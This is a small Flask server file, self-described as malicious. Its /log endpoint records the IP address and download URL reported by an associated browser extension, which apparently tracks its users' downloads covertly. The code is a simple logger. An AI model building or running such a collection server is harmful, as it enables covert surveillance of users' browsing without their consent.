"""
A flask server that does malicious things.
"""

from flask import Flask, request, jsonify

app = Flask(__name__)


def log_download(ip: str, url: str) -> None:
    """
    Adds the ip and url to a file that tracks all the downloads made when someone has used the
    associated extension.
    """

    with open("logs.txt", "a+") as file:
        file.write(ip + " " + url + "\n")

@app.route('/log', methods=["GET"])
def log_route():
    """
    The handler for the /log route.
    """

    url = request.args.get("url")

    if url:
        log_download(request.remote_addr, url)

    return ""


if __name__ == "__main__":
    app.run(debug=True, port=5001)
